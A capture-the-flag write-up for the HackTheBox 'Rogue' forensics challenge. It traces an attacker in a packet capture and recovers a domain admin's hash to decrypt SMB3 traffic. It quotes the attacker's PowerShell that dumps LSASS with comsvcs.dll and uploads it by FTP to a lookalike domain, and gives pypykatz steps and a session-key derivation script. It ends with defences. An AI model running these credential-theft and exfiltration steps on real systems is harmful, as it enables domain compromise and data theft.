## Overview

Rogue is a **Medium** HackTheBox **Forensics** challenge. You get one `capture.pcapng`. An insider sold C2 access to a low-privileged domain user; the capture records the attacker dumping credentials and reading a confidential file off the domain controller. The read is **SMB3-encrypted**, but SMB3 protects data in transit only — recover the right NT hash and every encrypted byte decrypts retroactively. The flag lives inside the stolen PDF.

## The technique

SMB3 encryption keys are derived deterministically from the NTLM **ExportedSessionKey**, which itself is recoverable offline from a user's NT hash plus the (captured) NTLMv2 challenge/response. The attacker dumped LSASS to steal the domain admin's hash; that same hash lets us reconstruct the session key and decrypt the SMB3 traffic they generated. This is a [credential-protection failure](https://cwe.mitre.org/data/definitions/522.html) (LSASS credential material) compounded by encryption without forward secrecy.

## Solution

**1 — Triage the capture.** The protocol hierarchy shows the three signals: a raw `tcp/4444` stream, a 22 MB `ftp-data` transfer, and SMB2/SMB3 over IPv6 to `CORP-DC`.

```bash
capinfos capture.pcapng
tshark -r capture.pcapng -q -z io,phs
```

**2 — Read the plaintext C2 (tcp/4444).**

```bash
tshark -r capture.pcapng -q -z follow,tcp,ascii,0
```

It reveals `ws02\rpaker`, that `CORP\athomson` (a domain admin) is logged onto the workstation, and the LSASS dump + exfil one-liner:

```powershell
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\3858793632.pmd full
Compress-Archive C:\windows\temp\3858793632.pmd C:\windows\temp\3858793632.zip
$cl.UploadFile("ftp://ftpuser:<redacted>@windowsliveupdater.com/3858793632.zip", ...)
```

**3 — Carve the exfiltrated LSASS dump** from the FTP-DATA stream:

```bash
tshark -r capture.pcapng -q -z follow,tcp,raw,5 | grep -E '^[0-9a-f]+$' | tr -d '\n' | xxd -r -p > stolen.zip
unzip stolen.zip    # -> 3858793632.pmd (lsass minidump)
```

**4 — Pull the domain-admin NT hash:**

```bash
pypykatz lsa minidump 3858793632.pmd    # athomson CORP NT: <redacted>
```

**5 — Derive the SMB3 session key offline.** The whole solve is this script — it reads the NTLMv2 fields live from the pcap, verifies the NT hash against the NTProofStr, and prints the SMB3 `ExportedSessionKey`, then decrypts and exports the stolen file:

Create `solve.py`:

```python
import hashlib, hmac, subprocess, os, tempfile
from Crypto.Cipher import ARC4

PCAP = "capture.pcapng"
NT_HASH  = bytes.fromhex("<athomson_nt_hash>")
USER, DOMAIN = "athomson", "CORP"
SRV_CHAL = bytes.fromhex("<ntlmssp_server_challenge>")
ENC_SESSKEY = bytes.fromhex("<ntlmssp_auth_sesskey>")
SESSION_ID  = "<smb2_sesid_little_endian>"

def full_ntresp():
    return subprocess.check_output(
        ["tshark","-r",PCAP,"-Y","tcp.stream==50 && ntlmssp.messagetype==0x00000003",
         "-T","fields","-e","ntlmssp.auth.ntresponse"]).split()[0].decode()

def smb3_session_key(ntresp_hex):
    ntresp = bytes.fromhex(ntresp_hex)
    proof, temp = ntresp[:16], ntresp[16:]
    respkey = hmac.new(NT_HASH, (USER.upper()+DOMAIN).encode("utf-16-le"), hashlib.md5).digest()
    assert hmac.new(respkey, SRV_CHAL+temp, hashlib.md5).digest() == proof, "NT hash wrong"
    kek = hmac.new(respkey, proof, hashlib.md5).digest()   # SessionBaseKey == KEK (NTLMv2)
    return ARC4.new(kek).decrypt(ENC_SESSKEY).hex()         # ExportedSessionKey

def decrypt_and_export(seskey):
    prof = tempfile.mkdtemp()
    with open(os.path.join(prof,"smb2_seskey_list"),"w") as f:
        f.write(f"{SESSION_ID},{seskey},,\n")               # Wireshark 4.x UAT, UNQUOTED
    env = dict(os.environ, WIRESHARK_CONFIG_DIR=prof)
    os.makedirs("smbout", exist_ok=True)
    subprocess.run(["tshark","-r",PCAP,"--export-objects","smb,smbout"], env=env)

seskey = smb3_session_key(full_ntresp())
print("[+] SMB3 ExportedSessionKey:", seskey)
decrypt_and_export(seskey)
print("[+] exported ->", os.listdir("smbout"))
```

```bash
python3 solve.py
pdftotext 'smbout/%5ccustomer_information.pdf' -    # -> HTB{...}
```

The exported `customer_information.pdf` is the file the attacker read off `\\CORP-DC\ConfidentialShare`; its text contains the flag `HTB{...}`.

## Why it worked

SMB3 gives confidentiality only while its session keys stay secret. The per-session AES key is derived from the NTLM ExportedSessionKey, which is recoverable from the user's NT hash plus the captured NTLMv2 handshake — there is no forward secrecy. Once the attacker's own LSASS dump surrenders the domain admin's hash, every previously "encrypted" SMB3 byte on the wire can be decrypted after the fact.

## Fix / defense

- Protect LSASS: Credential Guard / `RunAsPPL=1` so `comsvcs` MiniDump can't read it, plus the ASR rule blocking credential theft from LSASS.
- Enforce a tiered-admin model — a domain admin should never authenticate on a low-trust workstation; `athomson`'s presence in WS02's LSASS is the entire compromise.
- Egress filtering: outbound FTP to an arbitrary host and a fresh `windowsliveupdater.com` lookup are trivial detections.
- SMB signing/encryption does not defend against a key-recovery adversary — the real control is keeping credential material off endpoints.
